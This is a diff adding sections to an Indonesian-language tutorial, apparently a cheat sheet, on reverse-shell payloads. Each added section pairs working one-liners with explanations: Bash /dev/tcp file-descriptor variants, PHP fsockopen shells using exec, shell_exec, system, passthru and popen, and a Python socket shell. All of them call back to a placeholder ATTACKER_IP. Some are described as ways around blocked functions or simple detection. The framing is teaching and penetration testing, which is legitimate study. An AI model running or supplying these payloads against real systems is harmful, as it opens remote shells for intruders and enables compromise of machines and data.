@@ -278,4 +278,115 @@ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
 - `/dev/tcp/ATTACKER_IP/443`: Ini fitur unik Bash. Dia ngebuka koneksi TCP ke `ATTACKER_IP` di port `443`.
 - `0>&1`: Redirect input (stdin) ke stdout (yang udah tersambung ke koneksi TCP tadi).
 
-Intinya, command ini bikin input dan output shell Bash kita connect langsung ke komputer attacker lewat jaringan.
+Intinya, command ini bikin input dan output shell Bash kita "nyambung" langsung ke komputer attacker lewat jaringan.
+
+### Bash Advanced Payloads
+
+Selain yang standar, ada juga variasi payload Bash yang mainin **File Descriptors**. Ini berguna kalau cara biasa gak jalan atau diblokir.
+
+**1. Bash Read Line Reverse Shell**
+
+```bash
+exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
+```
+
+**Penjelasan:**
+
+- `exec 5<>...`: Bikin file descriptor baru (nomor 5) yang nyambung ke koneksi TCP.
+- `while read line`: Baca perintah dari attacker lewat file descriptor 5.
+- `$line 2>&5 >&5`: Jalanin perintahnya, terus kirim output dan error balik ke file descriptor 5 (ke attacker).
+
+**2. Bash With File Descriptor 196**
+
+```bash
+0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
+```
+
+**Penjelasan:**
+Sama kayak yang di atas, tapi pake nomor file descriptor acak (196) buat ngehindarin konflik atau deteksi simpel. Dia nge-spawn shell `sh` yang input/output-nya diredirect ke koneksi TCP (fd 196).
+
+**3. Bash With File Descriptor 5 (Short Version)**
+
+```bash
+bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
+```
+
+**Penjelasan:**
+Mirip banget sama yang pertama, tapi lebih ringkas.
+
+- `bash -i`: Jalanin bash interaktif.
+- `5<> /dev/tcp...`: Buka koneksi TCP di fd 5.
+- `0<&5 1>&5 2>&5`: Redirect semua standar input (0), output (1), dan error (2) ke fd 5.
+
+### PHP
+
+Kalau targetnya web server yang jalanin PHP (kayak WordPress atau Joomla), payload ini sangat efektif
+
+**PHP Reverse Shell Using exec**
+
+```bash
+php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
+```
+
+**Penjelasan Payload:**
+
+- `php -r`: Jalanin kode PHP langsung dari terminal (inline).
+- `fsockopen("ATTACKER_IP",443)`: Buka koneksi socket ke attacker.
+- `exec("sh <&3 >&3 2>&3")`: Jalanin shell `sh`. Angka `3` di sini adalah file descriptor yang dipake sama socket tadi. Jadi input/output shell dialirin lewat socket itu.
+
+Payload ini sering dipake di web shell atau RCE (Remote Code Execution) di aplikasi web berbasis PHP.
+
+Selain `exec`, ada fungsi PHP lain yang bisa dipake, terutama kalau `exec` diblokir sama admin (disabled_functions).
+
+**1. PHP Using `shell_exec`**
+
+```bash
+php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
+```
+
+Sama persis kayak `exec`, cuma beda fungsi pemanggilnya aja.
+
+**2. PHP Using `system`**
+
+```bash
+php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
+```
+
+Fungsi `system` ini bakal ngejalanin command dan langsung nampilin hasilnya (output) ke browser atau terminal.
+
+**3. PHP Using `passthru`**
+
+```bash
+php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
+```
+
+`passthru` cocok banget kalau outputnya berupa data mentah (binary data), dia bakal ngirim output "apa adanya" balik ke kita.
+
+**4. PHP Using `popen`**
+
+```bash
+php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
+```
+
+`popen` ngebuka process file pointer. Jadi dia ngebuka koneksi kayak file biasa, tapi isinya command yang mau dijalankan.
+
+### Python
+
+Python ini bahasa wajib buat anak security. Hampir semua sistem Linux modern udah ada Python nya.
+
+**Python Reverse Shell**
+
+```bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+**Penjelasan Payload:**
+
+- `python -c`: Jalanin kode Python langsung dari command line (inline).
+- `import socket,subprocess,os`: Import library yang dibutuhin buat networking dan sistem operasi.
+- `s=socket.socket(...)`: Bikin socket TCP connection.
+- `s.connect(("ATTACKER_IP",443))`: Connect ke IP attacker di port 443.
+- `os.dup2(s.fileno(),0/1/2)`: Ini bagian krusial. Dia nge-duplicate file descriptor socket (`s`) ke **stdin (0)**, **stdout (1)**, dan **stderr (2)**.
+- `subprocess.call(["/bin/sh","-i"])`: Jalanin shell interaktif `/bin/sh`.
+
+Jadi, input/output dari shell `/bin/sh` bakal "numpang" lewat socket yang udah terkoneksi ke attacker.
